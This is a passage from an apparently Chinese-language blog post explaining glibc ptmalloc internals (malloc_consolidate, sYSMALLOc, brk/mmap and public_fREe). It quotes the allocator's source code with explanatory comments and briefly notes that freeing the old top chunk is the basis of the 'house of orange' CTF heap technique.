class="line">	    &#125; <span class="keyword">else</span></span><br><span class="line">	      clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	    first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">	    unsorted_bin-&gt;fd = p;</span><br><span class="line">	    first_unsorted-&gt;bk = p;    <span class="comment">// 将合并后的堆块插入到 unsorted bin</span></span><br><span class="line"></span><br><span class="line">	    <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;   <span class="comment">// 如果合并之后的 chunk 是一个 large bin chunk</span></span><br><span class="line">	      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	      p-&gt;bk_nextsize = <span class="literal">NULL</span>;    <span class="comment">// unsortedbin 中 这两个指针无用，清空</span></span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    set_head(p, size | PREV_INUSE);</span><br><span class="line">	    p-&gt;bk = unsorted_bin;</span><br><span class="line">	    p-&gt;fd = first_unsorted;</span><br><span class="line">	    set_foot(p, size);    <span class="comment">// 将 largebin chunk 插入 unsortedbin</span></span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">else</span> &#123;</span><br><span class="line">	    size += nextsize;    <span class="comment">// 如果和 top chunk 相邻，则与 topchunk 合并</span></span><br><span class="line">	    set_head(p, size | PREV_INUSE);</span><br><span class="line">	    av-&gt;top = p;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);  <span class="comment">// 初始化分配区</span></span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>consolidate 的逻辑还算简单，主要是对 fastbin 进行操作，首先要判断分配区是否已经初始化，如果是，会逐个 fastbin 链表进行遍历，如果链表为空，就转移到下一个链表，如果不空，就依次取出其中的 chunk，首先判断是否能够进行后向合并，然后判断是否能进行前向合并，最后判断能否与 topchunk 合并，在合并的过程中，要考虑到合并出来的堆块是 smallbin 还是 largebin，以便于用不同的方式插入 unsortedbin。参考下图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_8.png"
                      alt="malloc_free_8.png"
                ></p>
<h2 id="sYSMALLOc"><a href="#sYSMALLOc" class="headerlink" title="sYSMALLOc"></a>sYSMALLOc</h2><p>这个函数会在所有缓冲区和 topchunk 都不能满足分配要求时调用，主要功能是向操作系统申请新的内存。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> __STD_C</span></span><br><span class="line"><span class="type">static</span> Void_t* <span class="title function_">sYSMALLOc</span><span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">static</span> Void_t* <span class="title function_">sYSMALLOc</span><span class="params">(nb, av)</span> INTERNAL_SIZE_T nb; mstate av;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr       old_top;        <span class="comment">/* incoming value of av-&gt;top */</span></span><br><span class="line">  INTERNAL_SIZE_T old_size;       <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">char</span>*           old_end;        <span class="comment">/* its end address */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span>            size;           <span class="comment">/* arg to first MORECORE or mmap call */</span></span><br><span class="line">  <span class="type">char</span>*           brk;            <span class="comment">/* return value from MORECORE */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span>            correction;     <span class="comment">/* arg to 2nd MORECORE call */</span></span><br><span class="line">  <span class="type">char</span>*           snd_brk;        <span class="comment">/* 2nd return val */</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T front_misalign; <span class="comment">/* unusable bytes at front of new space */</span></span><br><span class="line">  INTERNAL_SIZE_T end_misalign;   <span class="comment">/* partial page left at end of new space */</span></span><br><span class="line">  <span class="type">char</span>*           aligned_brk;    <span class="comment">/* aligned offset into brk */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr       p;              <span class="comment">/* the allocated/returned chunk */</span></span><br><span class="line">  mchunkptr       remainder;      <span class="comment">/* remainder from allocation */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span>   remainder_size; <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span>   sum;            <span class="comment">/* for updating stats */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span>          pagemask  = mp_.pagesize - <span class="number">1</span>;</span><br><span class="line">  <span class="type">bool</span>            tried_mmap = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure></div>

<p>首先是各种变量的定义，它们的功能在注释里面写的比较清楚。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_MMAP</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.mmap_threshold) &amp;&amp;</span><br><span class="line">      (mp_.n_mmaps &lt; mp_.n_mmaps_max)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* mm;             <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">  try_mmap:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Round up size to nearest page.  For mmapped chunks, the overhead</span></span><br><span class="line"><span class="comment">      is one SIZE_SZ unit larger than for normal chunks, because there</span></span><br><span class="line"><span class="comment">      is no following chunk whose prev_size field could be used.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line">    <span class="comment">/* See the front_misalign handling below, for glibc there is no</span></span><br><span class="line"><span class="comment">       need for further alignments.  */</span></span><br><span class="line">    size = (nb + SIZE_SZ + pagemask) &amp; ~pagemask;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    size = (nb + SIZE_SZ + MALLOC_ALIGN_MASK + pagemask) &amp; ~pagemask;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>接着判断一下 HAVE_MMAP 宏定义是否为 1，引用 malloc.c 的注释如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Define HAVE_MMAP as true to optionally make malloc() use mmap() to</span><br><span class="line">  allocate very large blocks.  These will be returned to the</span><br><span class="line">  operating system immediately after a free(). Also, if mmap</span><br><span class="line">  is available, it is used as a backup strategy in cases where</span><br><span class="line">  MORECORE fails to provide space from system.</span><br><span class="line"></span><br><span class="line">  This malloc is best tuned to work with mmap for large requests.</span><br><span class="line">  If you do not have mmap, operations involving very large chunks (1MB</span><br><span class="line">  or so) may be slower than you&#x27;d like.</span><br></pre></td></tr></table></figure></div>

<p>选项是可以自定义的，这是因为有些操作系统并不支持 mmap，又或者用户不希望程序使用 mmap 向系统申请空间，就可以将这个选项关闭。</p>
<p>然后会判断是否能通过 mmap 分配内存，需要满足 2 个条件，一是 nb 大于等于 mmap 的分配阈值，二是当前进程通过 mmap 方式分配的内存总量小于最大值，这两个最大值分别是</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DEFAULT_MMAP_THRESHOLD     128 * 1024</span><br><span class="line">DEFAULT_MMAP_MAX       (65536)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>不知道为什么，第二个判断似乎总能成功，有了解的大哥请告诉我</p>
</blockquote>
<p>如果上面两个条件都能满足，就会进入到 mmap 的分配流程，首先要重新计算 size，引用 malloc.c 的注释如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Round up size to nearest page.  For mmapped chunks, the overhead</span><br><span class="line">      is one SIZE_SZ unit larger than for normal chunks, because there</span><br><span class="line">      is no following chunk whose prev_size field could be used.</span><br></pre></td></tr></table></figure></div>

<p>重新计算 size 的原因有两个，一是 mmap 分配的内存块必须页对齐，二是 mmap 分配出来的堆块没有下一个堆块的 prev_size 空间可以复用，所以需要重新计算 size。</p>
<p>计算 size 之后会执行下面的代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">tried_mmap = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Don&#x27;t try if size wraps around 0 */</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb)) &#123;</span><br><span class="line"></span><br><span class="line">      mm = (<span class="type">char</span>*)(MMAP(<span class="number">0</span>, size, PROT_READ|PROT_WRITE, MAP_PRIVATE));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (mm != MAP_FAILED) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	  The offset to the start of the mmapped region is stored</span></span><br><span class="line"><span class="comment">	  in the prev_size field of the chunk. This allows us to adjust</span></span><br><span class="line"><span class="comment">	  returned start address to meet alignment requirements here</span></span><br><span class="line"><span class="comment">	  and in memalign(), and still be able to compute proper</span></span><br><span class="line"><span class="comment">	  address argument for later munmap in free() and realloc().</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line">	<span class="comment">/* For glibc, chunk2mem increases the address by 2*SIZE_SZ and</span></span><br><span class="line"><span class="comment">	   MALLOC_ALIGN_MASK is 2*SIZE_SZ-1.  Each mmap&#x27;ed area is page</span></span><br><span class="line"><span class="comment">	   aligned and therefore definitely MALLOC_ALIGN_MASK-aligned.  */</span></span><br><span class="line">	assert (((INTERNAL_SIZE_T)chunk2mem(mm) &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	front_misalign = (INTERNAL_SIZE_T)chunk2mem(mm) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">	<span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	  correction = MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">	  p = (mchunkptr)(mm + correction);</span><br><span class="line">	  p-&gt;prev_size = correction;</span><br><span class="line">	  set_head(p, (size - correction) |IS_MMAPPED);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	  &#123;</span><br><span class="line">	    p = (mchunkptr)mm;</span><br><span class="line">	    set_head(p, size|IS_MMAPPED);</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* update statistics */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (++mp_.n_mmaps &gt; mp_.max_n_mmaps)</span><br><span class="line">	  mp_.max_n_mmaps = mp_.n_mmaps;</span><br><span class="line"></span><br><span class="line">	sum = mp_.mmapped_mem += size;</span><br><span class="line">	<span class="keyword">if</span> (sum &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.max_mmapped_mem))</span><br><span class="line">	  mp_.max_mmapped_mem = sum;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> NO_THREADS</span></span><br><span class="line">	sum += av-&gt;system_mem;</span><br><span class="line">	<span class="keyword">if</span> (sum &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.max_total_mem))</span><br><span class="line">	  mp_.max_total_mem = sum;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	check_chunk(av, p);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> chunk2mem(p);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>首先要判断 size 是否小于 nb，如果出现这种情况，说明 size 发生了溢出，不会继续分配内存，否则进入到主要的 mmap 逻辑。 直接调用 mmap 函数尝试分配一个堆块，分配成功就不需要进一步检查对齐的问题了，因为 mmap 的堆块本来就是页对齐的。</p>
<p>之后会将堆块的 IS_MMAPED 标志位置 1，表示它是通过 mmap 方式分配出来的。之后就是一些更新全局变量的操作，并且返回堆块。</p>
<p>如果在 mmap 这一支不能成功分配堆块，有 3 种情况，一是 nb 大于 mmap 的分配阈值，二是 size 发生溢出，不能通过 mmap 分配，三是 mmap 分配失败。</p>
<p>如果发生上面的三种情况，会进入到下一个阶段，即拓展 top chunk</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line">  old_top  = av-&gt;top;</span><br><span class="line">  old_size = chunksize(old_top);</span><br><span class="line">  old_end  = (<span class="type">char</span>*)(chunk_at_offset(old_top, old_size));</span><br><span class="line"></span><br><span class="line">  brk = snd_brk = (<span class="type">char</span>*)(MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">     at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">	 ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">	  prev_inuse(old_top) &amp;&amp;</span><br><span class="line">	  ((<span class="type">unsigned</span> <span class="type">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">  assert((<span class="type">unsigned</span> <span class="type">long</span>)(old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE));</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ATOMIC_FASTBINS</span></span><br><span class="line">  <span class="comment">/* Precondition: all fastbins are consolidated */</span></span><br><span class="line">  assert(!have_fastchunks(av));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>首先保存旧的 top chunk 信息，然后判断 top chunk 是否合法，当程序执行到这里，top chunk 有两种情况，一是没有被初始化，size 等于 0，二是已经被初始化，但是 size 不能满足 nb，这使就要求 size 大于 MINSIZE ，并且 prev_inuse 标志位为 1，并且 top chunk 的尾部是对齐的。</p>
<p>最下面是一个比较重要的判断，如果没有开启 ATOMIC_FASTBINS，当程序执行到这里时，所有的 fastbin chunk 一定是通过 consolidate 合并过了，如果还有 fastbin chunk 残留在链表中，说明发生了一些错误。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av != &amp;main_arena) &#123;  <span class="comment">// 当前分配区不是主分配区</span></span><br><span class="line"></span><br><span class="line">    heap_info *old_heap, *heap;</span><br><span class="line">    <span class="type">size_t</span> old_heap_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First try to extend the current heap. */</span></span><br><span class="line">    old_heap = heap_for_ptr(old_top); </span><br><span class="line">    old_heap_size = old_heap-&gt;size;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">	&amp;&amp; grow_heap(old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>) &#123;  <span class="comment">// 尝试扩展当前 heap</span></span><br><span class="line">      av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">      arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">      <span class="keyword">if</span>(mmapped_mem + arena_mem + sbrked_mem &gt; max_total_mem)</span><br><span class="line">	max_total_mem = mmapped_mem + arena_mem + sbrked_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      set_head(old_top, (((<span class="type">char</span> *)old_heap + old_heap-&gt;size) - (<span class="type">char</span> *)old_top)</span><br><span class="line">	       | PREV_INUSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap(nb + (MINSIZE + <span class="keyword">sizeof</span>(*heap)), mp_.top_pad))) &#123;  <span class="comment">// 扩展 heap 失败，尝试分配新的 heap</span></span><br><span class="line">      <span class="comment">/* Use a newly allocated heap.  */</span></span><br><span class="line">      heap-&gt;ar_ptr = av;</span><br><span class="line">      heap-&gt;prev = old_heap;</span><br><span class="line">      av-&gt;system_mem += heap-&gt;size;</span><br><span class="line">      arena_mem += heap-&gt;size;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">      <span class="keyword">if</span>((<span class="type">unsigned</span> <span class="type">long</span>)(mmapped_mem + arena_mem + sbrked_mem) &gt; max_total_mem)</span><br><span class="line">	max_total_mem = mmapped_mem + arena_mem + sbrked_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Set up the new top.  */</span></span><br><span class="line">      top(av) = chunk_at_offset(heap, <span class="keyword">sizeof</span>(*heap));</span><br><span class="line">      set_head(top(av), (heap-&gt;size - <span class="keyword">sizeof</span>(*heap)) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Setup fencepost and free the old top chunk. */</span></span><br><span class="line">      <span class="comment">/* The fencepost takes at least MINSIZE bytes, because it might</span></span><br><span class="line"><span class="comment">	 become the top chunk again later.  Note that a footer is set</span></span><br><span class="line"><span class="comment">	 up, too, although the chunk is marked in use. */</span></span><br><span class="line">      old_size -= MINSIZE;</span><br><span class="line">      set_head(chunk_at_offset(old_top, old_size + <span class="number">2</span>*SIZE_SZ), <span class="number">0</span>|PREV_INUSE);</span><br><span class="line">      <span class="keyword">if</span> (old_size &gt;= MINSIZE) &#123;</span><br><span class="line">	set_head(chunk_at_offset(old_top, old_size), (<span class="number">2</span>*SIZE_SZ)|PREV_INUSE);</span><br><span class="line">	set_foot(chunk_at_offset(old_top, old_size), (<span class="number">2</span>*SIZE_SZ));</span><br><span class="line">	set_head(old_top, old_size|PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">	_int_free(av, old_top, <span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	_int_free(av, old_top);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	set_head(old_top, (old_size + <span class="number">2</span>*SIZE_SZ)|PREV_INUSE);</span><br><span class="line">	set_foot(old_top, (old_size + <span class="number">2</span>*SIZE_SZ));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!tried_mmap)   <span class="comment">// 检查是否还能使用 mmap</span></span><br><span class="line">      <span class="comment">/* We can at least try to use to mmap memory.  */</span></span><br><span class="line">      <span class="keyword">goto</span> try_mmap;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>如果当前线程的分配区不是主分配区，会先尝试拓展当前的 heap，通过调整 sub_heap 的边界尝试获取更多的空间，如果失败，就会尝试新建一个 heap(使用 brk() 拓展) ，在新建 heap 的代码中，和 pwn 题有关系的就是 __int_free(av, old_top)，这句代码，因为它会将旧的 top chunk 加入到 unsortedbin 中，这也是 house of orange 以及一系列衍生攻击的基础。</p>
<p><strong>注意！ 下面的代码从 sYSMALLOc 尾部取得</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* if (av !=  &amp;main_arena) */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)av-&gt;system_mem &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(av-&gt;max_system_mem))</span><br><span class="line">    av-&gt;max_system_mem = av-&gt;system_mem;</span><br><span class="line">  check_malloc_state(av);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* finally, do the allocation */</span></span><br><span class="line">  p = av-&gt;top;</span><br><span class="line">  size = chunksize(p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check that one of the above allocation paths succeeded */</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE)) &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset(p, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head(p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    check_malloced_chunk(av, p, nb);</span><br><span class="line">    <span class="keyword">return</span> chunk2mem(p);    <span class="comment">// 返回堆块</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>拓展出新的 heap 之后就可以切割出满足要求的堆块了。</p>
<p>如果拓展 topchunk 或者是 分配新的 heap 都失败了，就会检查是否尝试过 mmap，如果没有，就会跳转到 mmap 部分尝试映射一块内存。</p>
<p>如果当前分配区属于主分配区，那么情况要复杂很多，不过最后的效果是差不多的，而且这段代码和 pwn 题关联并不是很大，想要详细了解的同学可以自行分析一下 glibc 的源代码。</p>
<p>sYSMALLOc 的执行流程可以参考下面这张图片(省略了在主分配区的情况)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_9.png"
                      alt="malloc_free_9.png"
                ></p>
<h2 id="malloc-几个细节"><a href="#malloc-几个细节" class="headerlink" title="malloc 几个细节"></a>malloc 几个细节</h2><p>malloc 还有几个细节，在这里稍作解释。</p>
<ol>
<li>物理内存分配时间。上一篇文章提到调用 malloc 并不会立即在物理页面上创建相应的堆块，而是当用户真正使用这块空间的时候才会创建，这是由于 malloc 给程序分配的是虚拟地址，当程序访问这个虚拟地址的时候，MMU 发现虚拟地址没有对应的物理内存，触发页中断，这时候硬件会陷入内核处理中断，操作系统负责分配物理内存，MMU 再将虚拟地址绑定到物理内存上面，完成内存分配操作。</li>
<li>MMU： 英文 Memory Management Unit 内存管理单元，这个模块一般都被集成在 CPU 中，CPU 发出的是虚拟地址(例如调试的时候经常看到的 0x400000 等)，正常情况下这个如果使用这个地址去寻找内存的话是找不到的，需要先经过 MMU 将虚拟地址转换成物理内存地址才能正常寻址。</li>
</ol>
<p>简单理解 brk 与 mmap：</p>
<p>这两个属于底层的系统调用，malloc 就是依靠它们完成内存分配的，brk 在原有的 heap 基础上进行拓展，而 mmap 尝试在堆栈之间找一块内存。</p>
<p>以下图为例，这是一个简单的内存模型</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_10.png"
                      alt="malloc_free_10.png"
                ></p>
<p>如果用户申请了一块比较大的内存，当前 top chunk 大小不足以容纳(并且没有超过 mmap 的阈值)，就会调用 sYSMALLOc 尝试拓展当前 heap。这里要介绍一个指针 _edate，它被定义在 glibc 中，指向当前进程数据段的最高地址，当拓展 heap 的时候，会调 brk 这个系统调用，例如连续分配两个大小为 0x7800 的堆块，调用 brk 之后如图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_11.png"
                      alt="malloc_free_11.png"
                ></p>
<p>所以 brk 的大致原理就是抬高 _edata 指针，来拓展当前的 heap。</p>
<p>当用户申请的 chunk 大小超过 mmap 阈值，会直接调用 mmap 来分配堆块，例如申请一个大小为 0x22000 的堆块，mmap 之后如图<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_12.png"
                      alt="malloc_free_12.png"
                ></p>
<p>free 的时候也是一样，如果 free mmap 的区域，ptmalloc 会直接将内存返回给系统，但是当 free chunk1 的时候，由于 _edata 指针指向数据段的最高地址，而最高地址还有一个 chunk2 正在被使用，这时不能收缩堆。而当 chunk2 也被 free 之后，1 2 两个 chunk 会自动合并，_edata 指针也就可以收缩了，chunk1 和 2 组成的一块内存会被归还操作系统。</p>
<h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p>前面分析了 malloc 以及几个附加函数，下面就要进入到 free 函数了。</p>
<p>操作系统的内存不是无限的，程序使用 malloc 向操作系统申请内存，不能一直占据不放，当这些内存不再使用的时候，需要使用 free 函数进行释放，以保证整个系统的正常运行。</p>
<p>简单的理解一下，free 函数所执行的操作其实可以视为 malloc 函数的逆过程，malloc 从缓冲区或者操作系统中拿取空间，而 free 则负责将这些空间放回缓冲区或者操作系统。</p>
<h2 id="public-fREe"><a href="#public-fREe" class="headerlink" title="public_fREe"></a>public_fREe</h2><p>此函数是 free 的外壳函数，所处理的问题和多线程有关，free 的核心函数是 __int_free</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">public_fREe</span><span class="params">(Void_t* mem)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">__malloc_ptr_t</span>, __const <span class="type">__malloc_ptr_t</span>)</span><br><span class="line">    = force_reg (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk(mem);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_MMAP</span></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped(p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">    <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">	&amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">	&amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">      &#123;</span><br><span class="line">	mp_.mmap_threshold = chunksize (p);</span><br><span class="line">	mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">      &#125;</span><br><span class="line">    munmap_chunk(p);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk(p);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">  _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> THREAD_STATS</span></span><br><span class="line">  <span class="keyword">if</span>(!mutex_trylock(&amp;ar_ptr-&gt;mutex))</span><br><span class="line">    ++(ar_ptr-&gt;stat_lock_direct);</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    (<span class="type">void</span>)mutex_lock(&amp;ar_ptr-&gt;mutex);</span><br><span class="line">    ++(ar_ptr-&gt;stat_lock_wait);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  (<span class="type">void</span>)mutex_lock(&amp;ar_ptr-&gt;mutex);</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  _int_free(ar_ptr, p);</span><br><span class="line">  (<span class="type">void</span>)mutex_unlock(&amp;ar_ptr-&gt;mutex);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="int-free"><a href="#int-free" class="headerlink" title="__int_free"></a>__int_free</h2><p>和 malloc 一样，free 函数的核心代码是 __int_free，可以在 malloc.c 中找到。</p>
<p>函数开头首先定义了一些局部变量，摘录如下</p>
